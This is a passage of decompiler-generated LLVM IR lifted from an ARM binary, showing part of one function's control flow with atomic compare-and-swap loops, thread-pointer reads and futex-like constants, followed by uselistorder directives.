dec_label_pc_14424:                               ; preds = %dec_label_pc_143f8, %dec_label_pc_1440c.dec_label_pc_14400_crit_edge, %dec_label_pc_14420
  %v0_14424 = phi i32 [ %v0_14420, %dec_label_pc_14420 ], [ %v2_14400133, %dec_label_pc_143f8 ], [ %v2_14400, %dec_label_pc_1440c.dec_label_pc_14400_crit_edge ]
  %v1_14424 = phi i32 [ %v0_14420, %dec_label_pc_14420 ], [ %v3_143e4, %dec_label_pc_143f8 ], [ %v1_14404.pre, %dec_label_pc_1440c.dec_label_pc_14400_crit_edge ]
  %v3_14424 = icmp uge i32 %v0_14424, %v1_14424
  store i1 %v3_14424, i1* %cpsr_c.global-to-local, align 1
  %v9_14424 = icmp eq i32 %v0_14424, %v1_14424
  br i1 %v9_14424, label %dec_label_pc_1442c, label %dec_label_pc_144a8.backedge

dec_label_pc_1442c:                               ; preds = %dec_label_pc_14424
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_14440 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_14430

dec_label_pc_14430:                               ; preds = %dec_label_pc_14498, %dec_label_pc_1442c
  %v0_14430 = load i32, i32* %r7.global-to-local, align 4
  %v1_14430 = add i32 %v0_14430, 4
  %v2_14430 = inttoptr i32 %v1_14430 to i32*
  %v3_14430 = load i32, i32* %v2_14430, align 4
  store i32 %v3_14430, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14434 = icmp eq i32 %v3_14430, 0
  br i1 %v2_14434, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_14430
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_14430, %bb
  %v2_1443c = xor i1 %v2_14434, true
  call void @__pseudo_cond_branch(i1 %v2_1443c, i32 %v3_14430)
  %v0_14444 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14444, i32* %stack_var_-88, align 4
  %v1_14448 = inttoptr i32 %v0_14444 to i32*
  %v2_14448 = load i32, i32* %v1_14448, align 4
  store i32 %v2_14448, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1444c = icmp eq i32 %v2_14448, 0
  store i32 %v2_14440, i32* %r5.global-to-local, align 4
  br i1 %v2_1444c, label %dec_label_pc_144b8.loopexit, label %dec_label_pc_14460

dec_label_pc_14460:                               ; preds = %bb72
  %v1_14460 = add i32 %v2_14448, 20
  store i32 %v1_14460, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14464

dec_label_pc_14464:                               ; preds = %dec_label_pc_14498.dec_label_pc_14464_crit_edge, %dec_label_pc_14460
  %v0_14468 = phi i32 [ %v0_14468.pre, %dec_label_pc_14498.dec_label_pc_14464_crit_edge ], [ %v1_14460, %dec_label_pc_14460 ]
  %v0_14464 = phi i32 [ %v0_14464.pre, %dec_label_pc_14498.dec_label_pc_14464_crit_edge ], [ %v2_14448, %dec_label_pc_14460 ]
  %v1_14464 = add i32 %v0_14464, 20
  %v2_14464 = inttoptr i32 %v1_14464 to i32*
  %v3_14464 = load i32, i32* %v2_14464, align 4
  store i32 %v0_14468, i32* %r2.global-to-local, align 4
  store i32 %v3_14464, i32* %r4.global-to-local, align 4
  %v1_14474119 = inttoptr i32 %v0_14468 to i32*
  %v2_14474120 = load i32, i32* %v1_14474119, align 4
  store i32 %v2_14474120, i32* %r3.global-to-local, align 4
  %v3_14478122 = icmp uge i32 %v2_14474120, %v3_14464
  store i1 %v3_14478122, i1* %cpsr_c.global-to-local, align 1
  %v9_14478128 = icmp eq i32 %v2_14474120, %v3_14464
  br i1 %v9_14478128, label %dec_label_pc_14480, label %dec_label_pc_14498

dec_label_pc_14480:                               ; preds = %dec_label_pc_14464, %dec_label_pc_14480.dec_label_pc_14474_crit_edge
  %v0_14480129 = phi i32 [ %v1_14478.pre, %dec_label_pc_14480.dec_label_pc_14474_crit_edge ], [ %v3_14464, %dec_label_pc_14464 ]
  store i32 %v0_14480129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14490 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14490, label %dec_label_pc_14494, label %dec_label_pc_14480.dec_label_pc_14474_crit_edge

dec_label_pc_14480.dec_label_pc_14474_crit_edge:  ; preds = %dec_label_pc_14480
  %v0_14474.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14478.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14474 = inttoptr i32 %v0_14474.pre to i32*
  %v2_14474 = load i32, i32* %v1_14474, align 4
  store i32 %v2_14474, i32* %r3.global-to-local, align 4
  %v3_14478 = icmp uge i32 %v2_14474, %v1_14478.pre
  store i1 %v3_14478, i1* %cpsr_c.global-to-local, align 1
  %v9_14478 = icmp eq i32 %v2_14474, %v1_14478.pre
  br i1 %v9_14478, label %dec_label_pc_14480, label %dec_label_pc_14498

dec_label_pc_14494:                               ; preds = %dec_label_pc_14480
  %v0_14494 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14494, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14498

dec_label_pc_14498:                               ; preds = %dec_label_pc_14464, %dec_label_pc_14480.dec_label_pc_14474_crit_edge, %dec_label_pc_14494
  %v0_14498 = phi i32 [ %v0_14494, %dec_label_pc_14494 ], [ %v2_14474120, %dec_label_pc_14464 ], [ %v2_14474, %dec_label_pc_14480.dec_label_pc_14474_crit_edge ]
  %v1_14498 = phi i32 [ %v0_14494, %dec_label_pc_14494 ], [ %v3_14464, %dec_label_pc_14464 ], [ %v1_14478.pre, %dec_label_pc_14480.dec_label_pc_14474_crit_edge ]
  %v3_14498 = icmp uge i32 %v0_14498, %v1_14498
  store i1 %v3_14498, i1* %cpsr_c.global-to-local, align 1
  %v9_14498 = icmp eq i32 %v0_14498, %v1_14498
  store i32 %v2_14440, i32* %r4.global-to-local, align 4
  br i1 %v9_14498, label %dec_label_pc_14430, label %dec_label_pc_14498.dec_label_pc_14464_crit_edge

dec_label_pc_14498.dec_label_pc_14464_crit_edge:  ; preds = %dec_label_pc_14498
  %v0_14464.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14468.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14464

dec_label_pc_144b4:                               ; preds = %dec_label_pc_144a8.backedge, %entry
  %v0_144bc31 = phi i32 [ ptrtoint (i32* @global_var_22244.363 to i32), %entry ], [ %v0_144a8, %dec_label_pc_144a8.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144b8

dec_label_pc_144b8.loopexit:                      ; preds = %bb72
  store i32 %v2_14440, i32* %r6.global-to-local, align 4
  %v0_144bc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_144b8

dec_label_pc_144b8:                               ; preds = %dec_label_pc_144b8.loopexit, %dec_label_pc_144b4
  %v0_144bc = phi i32 [ %v0_144bc.pre, %dec_label_pc_144b8.loopexit ], [ %v0_144bc31, %dec_label_pc_144b4 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_144bc = add i32 %v0_144bc, 152
  %v3_144bc = inttoptr i32 %v2_144bc to i32*
  %v4_144bc = load i32, i32* %v3_144bc, align 4
  store i32 %v4_144bc, i32* %r7.global-to-local, align 4
  %v0_144c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_144c0, i32* %r0.global-to-local, align 4
  %v1_144c4 = add i32 %v4_144bc, 8
  %v2_144c4 = inttoptr i32 %v1_144c4 to i32*
  %v3_144c4 = load i32, i32* %v2_144c4, align 4
  store i32 %v3_144c4, i32* %r3.global-to-local, align 4
  %v1_144c8 = add i32 %v0_144c0, -1168
  store i32 %v1_144c8, i32* %r5.global-to-local, align 4
  %v3_144cc = icmp uge i32 %v3_144c4, %v1_144c8
  store i1 %v3_144cc, i1* %cpsr_c.global-to-local, align 1
  %v9_144cc = icmp eq i32 %v3_144c4, %v1_144c8
  br i1 %v9_144cc, label %dec_label_pc_14634, label %dec_label_pc_144d4

dec_label_pc_144d4:                               ; preds = %dec_label_pc_144b8
  store i32 %v4_144bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_144e0112 = inttoptr i32 %v4_144bc to i32*
  %v2_144e0113 = load i32, i32* %v1_144e0112, align 4
  store i32 %v2_144e0113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_144e4115 = icmp eq i32 %v2_144e0113, 0
  br i1 %v9_144e4115, label %dec_label_pc_144ec, label %dec_label_pc_14504

dec_label_pc_144ec:                               ; preds = %dec_label_pc_144d4, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge
  %v0_144ec116 = phi i32 [ %v1_144e4.pre, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge ], [ 0, %dec_label_pc_144d4 ]
  store i32 %v0_144ec116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_144fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_144fc, label %dec_label_pc_14500, label %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge

dec_label_pc_144ec.dec_label_pc_144e0_crit_edge:  ; preds = %dec_label_pc_144ec
  %v0_144e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_144e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_144e0 = inttoptr i32 %v0_144e0.pre to i32*
  %v2_144e0 = load i32, i32* %v1_144e0, align 4
  store i32 %v2_144e0, i32* %r3.global-to-local, align 4
  %v3_144e4 = icmp uge i32 %v2_144e0, %v1_144e4.pre
  store i1 %v3_144e4, i1* %cpsr_c.global-to-local, align 1
  %v9_144e4 = icmp eq i32 %v2_144e0, %v1_144e4.pre
  br i1 %v9_144e4, label %dec_label_pc_144ec, label %dec_label_pc_14504

dec_label_pc_14500:                               ; preds = %dec_label_pc_144ec
  %v0_14500 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14500, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14504

dec_label_pc_14504:                               ; preds = %dec_label_pc_144d4, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge, %dec_label_pc_14500
  %v0_14504 = phi i32 [ %v0_14500, %dec_label_pc_14500 ], [ %v2_144e0113, %dec_label_pc_144d4 ], [ %v2_144e0, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge ]
  %v1_14504 = phi i32 [ %v0_14500, %dec_label_pc_14500 ], [ 0, %dec_label_pc_144d4 ], [ %v1_144e4.pre, %dec_label_pc_144ec.dec_label_pc_144e0_crit_edge ]
  %v3_14504 = icmp uge i32 %v0_14504, %v1_14504
  store i1 %v3_14504, i1* %cpsr_c.global-to-local, align 1
  %v9_14504 = icmp eq i32 %v0_14504, %v1_14504
  br i1 %v9_14504, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_14504
  %v1_14508 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14508, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_14504, %bb73
  %v1_1450c = xor i1 %v9_14504, true
  call void @__pseudo_cond_branch(i1 %v1_1450c, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_14510 = load i32, i32* %r5.global-to-local, align 4
  %v1_14510 = load i32, i32* %r7.global-to-local, align 4
  %v2_14510 = add i32 %v1_14510, 8
  %v3_14510 = inttoptr i32 %v2_14510 to i32*
  store i32 %v0_14510, i32* %v3_14510, align 4
  br label %dec_label_pc_14634

dec_label_pc_14634:                               ; preds = %bb74, %dec_label_pc_144b8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_14518 = load i32, i32* %r8.global-to-local, align 4
  %v2_14518 = add i32 %v0_14518, 152
  %v3_14518 = inttoptr i32 %v2_14518 to i32*
  %v4_14518 = load i32, i32* %v3_14518, align 4
  store i32 %v4_14518, i32* %r2.global-to-local, align 4
  %v1_1451c = add i32 %v4_14518, 4
  %v2_1451c = inttoptr i32 %v1_1451c to i32*
  %v3_1451c = load i32, i32* %v2_1451c, align 4
  %v1_14520 = add i32 %v3_1451c, 1
  store i32 %v1_14520, i32* %r3.global-to-local, align 4
  store i32 %v1_14520, i32* %v2_1451c, align 4
  %v0_14528 = load i32, i32* %r5.global-to-local, align 4
  %v1_14528 = add i32 %v0_14528, 108
  %v2_14528 = inttoptr i32 %v1_14528 to i32*
  %v3_14528 = load i32, i32* %v2_14528, align 4
  store i32 %v3_14528, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_14530 = sub i32 0, %v3_14528
  store i32 %v1_14530, i32* %v2_14528, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_14544 = load i32, i32* %r5.global-to-local, align 4
  %v1_14544 = add i32 %v0_14544, 104
  store i32 %v1_14544, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_14638.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_14638 = add i32 %v0_14544, 108
  %v3_14638 = inttoptr i32 %v2_14638 to i32*
  store i32 %v0_14638.pre, i32* %v3_14638, align 4
  %v0_1463c = load i32, i32* %r8.global-to-local, align 4
  %v1_1463c = load i32, i32* %r3.global-to-local, align 4
  %v2_1463c = add i32 %v1_1463c, %v0_1463c
  %v3_1463c = inttoptr i32 %v2_1463c to i32*
  %v4_1463c = load i32, i32* %v3_1463c, align 4
  store i32 %v4_1463c, i32* %r0.global-to-local, align 4
  %v1_14640 = add i32 %v4_1463c, 4
  %v2_14640 = inttoptr i32 %v1_14640 to i32*
  %v3_14640 = load i32, i32* %v2_14640, align 4
  %v1_14644 = add i32 %v3_14640, -1
  store i32 %v1_14644, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14648 = icmp eq i32 %v1_14644, 0
  store i32 %v1_14644, i32* %v2_14640, align 4
  br i1 %v2_14648, label %dec_label_pc_14654, label %dec_label_pc_14744thread-pre-split

dec_label_pc_14654:                               ; preds = %dec_label_pc_14634
  %v0_14654 = load i32, i32* %r3.global-to-local, align 4
  %v1_14654 = load i32, i32* %r0.global-to-local, align 4
  %v2_14654 = add i32 %v1_14654, 8
  %v3_14654 = inttoptr i32 %v2_14654 to i32*
  store i32 %v0_14654, i32* %v3_14654, align 4
  %v0_14658 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14658, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_1468c.dec_label_pc_1465c_crit_edge, %dec_label_pc_14654
  %v0_1465c = phi i32 [ %v0_1465c.pre, %dec_label_pc_1468c.dec_label_pc_1465c_crit_edge ], [ %v0_14658, %dec_label_pc_14654 ]
  %v1_1465c = inttoptr i32 %v0_1465c to i32*
  %v2_1465c = load i32, i32* %v1_1465c, align 4
  store i32 %v2_1465c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1465c, i32* %r2.global-to-local, align 4
  %v2_14668100 = load i32, i32* %v1_1465c, align 4
  store i32 %v2_14668100, i32* %r3.global-to-local, align 4
  %v3_1466c102 = icmp uge i32 %v2_14668100, %v2_1465c
  store i1 %v3_1466c102, i1* %cpsr_c.global-to-local, align 1
  %v9_1466c108 = icmp eq i32 %v2_14668100, %v2_1465c
  br i1 %v9_1466c108, label %dec_label_pc_14674, label %dec_label_pc_1468c

dec_label_pc_14674:                               ; preds = %dec_label_pc_1465c, %dec_label_pc_14674.dec_label_pc_14668_crit_edge
  %v0_14674109 = phi i32 [ %v1_1466c.pre, %dec_label_pc_14674.dec_label_pc_14668_crit_edge ], [ %v2_1465c, %dec_label_pc_1465c ]
  store i32 %v0_14674109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14684 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14684, label %dec_label_pc_14688, label %dec_label_pc_14674.dec_label_pc_14668_crit_edge

dec_label_pc_14674.dec_label_pc_14668_crit_edge:  ; preds = %dec_label_pc_14674
  %v0_14668.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1466c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14668 = inttoptr i32 %v0_14668.pre to i32*
  %v2_14668 = load i32, i32* %v1_14668, align 4
  store i32 %v2_14668, i32* %r3.global-to-local, align 4
  %v3_1466c = icmp uge i32 %v2_14668, %v1_1466c.pre
  store i1 %v3_1466c, i1* %cpsr_c.global-to-local, align 1
  %v9_1466c = icmp eq i32 %v2_14668, %v1_1466c.pre
  br i1 %v9_1466c, label %dec_label_pc_14674, label %dec_label_pc_1468c

dec_label_pc_14688:                               ; preds = %dec_label_pc_14674
  %v0_14688 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14688, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1468c

dec_label_pc_1468c:                               ; preds = %dec_label_pc_1465c, %dec_label_pc_14674.dec_label_pc_14668_crit_edge, %dec_label_pc_14688
  %v0_14694 = phi i32 [ %v0_14688, %dec_label_pc_14688 ], [ %v2_14668100, %dec_label_pc_1465c ], [ %v2_14668, %dec_label_pc_14674.dec_label_pc_14668_crit_edge ]
  %v1_1468c = phi i32 [ %v0_14688, %dec_label_pc_14688 ], [ %v2_1465c, %dec_label_pc_1465c ], [ %v1_1466c.pre, %dec_label_pc_14674.dec_label_pc_14668_crit_edge ]
  %v3_1468c = icmp uge i32 %v0_14694, %v1_1468c
  store i1 %v3_1468c, i1* %cpsr_c.global-to-local, align 1
  %v9_1468c = icmp eq i32 %v0_14694, %v1_1468c
  br i1 %v9_1468c, label %dec_label_pc_14694, label %dec_label_pc_1468c.dec_label_pc_1465c_crit_edge

dec_label_pc_1468c.dec_label_pc_1465c_crit_edge:  ; preds = %dec_label_pc_1468c
  %v0_1465c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1465c

dec_label_pc_14694:                               ; preds = %dec_label_pc_1468c
  %v2_14694 = icmp ne i32 %v1_1468c, 0
  store i1 %v2_14694, i1* %cpsr_c.global-to-local, align 1
  %v7_14698 = icmp slt i32 %v1_1468c, 2
  br i1 %v7_14698, label %dec_label_pc_14744thread-pre-split, label %dec_label_pc_1469c

dec_label_pc_1469c:                               ; preds = %dec_label_pc_14694
  %v0_1469c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1469c, i32* %r0.global-to-local, align 4
  %v0_146a0 = load i32, i32* @r1, align 4
  %v1_146a0 = add i32 %v0_146a0, 129
  store i32 %v1_146a0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14744thread-pre-split

dec_label_pc_146b8:                               ; preds = %dec_label_pc_14744thread-pre-split, %dec_label_pc_14740
  %v0_146b8 = phi i32 [ %v3_14740, %dec_label_pc_14740 ], [ %v0_14744.pr, %dec_label_pc_14744thread-pre-split ]
  %v1_146b8 = inttoptr i32 %v0_146b8 to i32*
  %v2_146b8 = load i32, i32* %v1_146b8, align 4
  store i32 %v2_146b8, i32* %r3.global-to-local, align 4
  %v1_146bc = add i32 %v2_146b8, 8
  %v2_146bc = inttoptr i32 %v1_146bc to i32*
  %v3_146bc = load i32, i32* %v2_146bc, align 4
  store i32 %v3_146bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146c0 = icmp eq i32 %v3_146bc, 0
  br i1 %v2_146c0, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_146b8
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_146b8, %bb75
  %v2_146c8 = xor i1 %v2_146c0, true
  call void @__pseudo_cond_branch(i1 %v2_146c8, i32 %v3_146bc)
  %v0_146cc = load i32, i32* %r6.global-to-local, align 4
  %v1_146cc = inttoptr i32 %v0_146cc to i32*
  %v2_146cc = load i32, i32* %v1_146cc, align 4
  store i32 %v2_146cc, i32* %r5.global-to-local, align 4
  %v1_146d0 = add i32 %v2_146cc, 20
  store i32 %v1_146d0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_146d4

dec_label_pc_146d4:                               ; preds = %dec_label_pc_14708.dec_label_pc_146d4_crit_edge, %bb76
  %v0_146d8 = phi i32 [ %v0_146d8.pre, %dec_label_pc_14708.dec_label_pc_146d4_crit_edge ], [ %v1_146d0, %bb76 ]
  %v0_146d4 = phi i32 [ %v0_146d4.pre, %dec_label_pc_14708.dec_label_pc_146d4_crit_edge ], [ %v2_146cc, %bb76 ]
  %v1_146d4 = add i32 %v0_146d4, 20
  %v2_146d4 = inttoptr i32 %v1_146d4 to i32*
  %v3_146d4 = load i32, i32* %v2_146d4, align 4
  store i32 %v0_146d8, i32* %r2.global-to-local, align 4
  store i32 %v3_146d4, i32* %r4.global-to-local, align 4
  %v1_146e0 = add i32 %v3_146d4, -1
  store i32 %v1_146e0, i32* @r1, align 4
  %v1_146e487 = inttoptr i32 %v0_146d8 to i32*
  %v2_146e488 = load i32, i32* %v1_146e487, align 4
  store i32 %v2_146e488, i32* %r3.global-to-local, align 4
  %v3_146e890 = icmp uge i32 %v2_146e488, %v3_146d4
  store i1 %v3_146e890, i1* %cpsr_c.global-to-local, align 1
  %v9_146e896 = icmp eq i32 %v2_146e488, %v3_146d4
  br i1 %v9_146e896, label %dec_label_pc_146f0, label %dec_label_pc_14708

dec_label_pc_146f0:                               ; preds = %dec_label_pc_146d4, %dec_label_pc_146f0.dec_label_pc_146e4_crit_edge
  %v0_146f097 = phi i32 [ %v1_146e8.pre, %dec_label_pc_146f0.dec_label_pc_146e4_crit_edge ], [ %v3_146d4, %dec_label_pc_146d4 ]
  store i32 %v0_146f097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14700 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14700, label %dec_label_pc_14704, label %dec_label_pc_146f0.dec_label_pc_146e4_crit_edge

dec_label_pc_146f0.dec_label_pc_146e4_crit_edge:  ; preds = %dec_label_pc_146f0
  %v0_146e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_146e8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_146e4 = inttoptr i32 %v0_146e4.pre to i32*
  %v2_146e4 = load i32, i32* %v1_146e4, align 4
  store i32 %v2_146e4, i32* %r3.global-to-local, align 4
  %v3_146e8 = icmp uge i32 %v2_146e4, %v1_146e8.pre
  store i1 %v3_146e8, i1* %cpsr_c.global-to-local, align 1
  %v9_146e8 = icmp eq i32 %v2_146e4, %v1_146e8.pre
  br i1 %v9_146e8, label %dec_label_pc_146f0, label %dec_label_pc_14708

dec_label_pc_14704:                               ; preds = %dec_label_pc_146f0
  %v0_14704 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14704, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14708

dec_label_pc_14708:                               ; preds = %dec_label_pc_146d4, %dec_label_pc_146f0.dec_label_pc_146e4_crit_edge, %dec_label_pc_14704
  %v0_14714 = phi i32 [ %v0_14704, %dec_label_pc_14704 ], [ %v2_146e488, %dec_label_pc_146d4 ], [ %v2_146e4, %dec_label_pc_146f0.dec_label_pc_146e4_crit_edge ]
  %v1_14708 = phi i32 [ %v0_14704, %dec_label_pc_14704 ], [ %v3_146d4, %dec_label_pc_146d4 ], [ %v1_146e8.pre, %dec_label_pc_146f0.dec_label_pc_146e4_crit_edge ]
  %v3_14708 = icmp uge i32 %v0_14714, %v1_14708
  store i1 %v3_14708, i1* %cpsr_c.global-to-local, align 1
  %v9_14708 = icmp eq i32 %v0_14714, %v1_14708
  store i32 %v0_14714, i32* %r2.global-to-local, align 4
  br i1 %v9_14708, label %dec_label_pc_14714, label %dec_label_pc_14708.dec_label_pc_146d4_crit_edge

dec_label_pc_14708.dec_label_pc_146d4_crit_edge:  ; preds = %dec_label_pc_14708
  %v0_146d4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_146d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_146d4

dec_label_pc_14714:                               ; preds = %dec_label_pc_14708
  %v2_14714 = icmp ne i32 %v1_14708, 0
  store i1 %v2_14714, i1* %cpsr_c.global-to-local, align 1
  %v7_14714 = icmp eq i32 %v1_14708, 1
  %v0_1471c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_14714, label %dec_label_pc_1471c, label %dec_label_pc_14740

dec_label_pc_1471c:                               ; preds = %dec_label_pc_14714
  %v1_1471c = inttoptr i32 %v0_1471c to i32*
  %v2_1471c = load i32, i32* %v1_1471c, align 4
  store i32 %v2_1471c, i32* @r1, align 4
  %v1_14720 = add i32 %v2_1471c, 24
  %v2_14720 = inttoptr i32 %v1_14720 to i32*
  %v3_14720 = load i32, i32* %v2_14720, align 4
  store i32 %v3_14720, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14724 = icmp eq i32 %v3_14720, 0
  br i1 %v2_14724, label %dec_label_pc_14740, label %dec_label_pc_1472c

dec_label_pc_1472c:                               ; preds = %dec_label_pc_1471c
  %v1_1472c = add i32 %v2_1471c, 20
  %v2_1472c = inttoptr i32 %v1_1472c to i32*
  %v3_1472c = load i32, i32* %v2_1472c, align 4
  store i32 %v3_1472c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14740

dec_label_pc_14740:                               ; preds = %dec_label_pc_14714, %dec_label_pc_1472c, %dec_label_pc_1471c
  %v1_14740 = add i32 %v0_1471c, 4
  %v2_14740 = inttoptr i32 %v1_14740 to i32*
  %v3_14740 = load i32, i32* %v2_14740, align 4
  store i32 %v3_14740, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14744 = icmp eq i32 %v3_14740, 0
  br i1 %v2_14744, label %dec_label_pc_1474c, label %dec_label_pc_146b8

dec_label_pc_14744thread-pre-split:               ; preds = %dec_label_pc_1469c, %dec_label_pc_14694, %dec_label_pc_14634
  %v0_14744.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1474411 = icmp eq i32 %v0_14744.pr, 0
  br i1 %v2_1474411, label %dec_label_pc_1474c, label %dec_label_pc_146b8

dec_label_pc_1474c:                               ; preds = %dec_label_pc_14740, %dec_label_pc_14744thread-pre-split
  %v0_1474c.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1474c.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_1474c.pre

; uselistorder directives
  uselistorder i32 %v0_14744.pr, { 1, 0 }
  uselistorder i32 %v3_14740, { 1, 2, 0 }
  uselistorder i32 %v1_14708, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14704, { 1, 0, 2 }
  uselistorder i32 %v1_146e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14688, { 1, 0, 2 }
  uselistorder i32 %v1_1466c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1465c, { 1, 0 }
  uselistorder i32 %v0_14500, { 1, 0, 2 }
  uselistorder i32 %v1_144e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_144bc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14494, { 1, 0, 2 }
  uselistorder i32 %v1_14478.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_14440, { 1, 0, 2 }
  uselistorder i32 %v0_14420, { 1, 0, 2 }
  uselistorder i32 %v1_14404.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 31, 2, 3, 5, 4, 32, 6, 7, 8, 9, 11, 10, 33, 12, 13, 14, 15, 16, 17, 18, 20, 19, 34, 21, 22, 23, 25, 24, 1, 26, 27, 29, 28, 0, 30 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 11, 5, 6, 7, 9, 8, 4, 10, 12, 13, 14, 29, 30, 15, 16, 17, 31, 32, 18, 19, 21, 20, 0, 22, 23, 24, 26, 25, 3, 28, 27, 2 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1474c, { 1, 0 }
  uselistorder label %dec_label_pc_14740, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14708, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146f0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_1468c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14674, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_14504, { 2, 1, 0 }
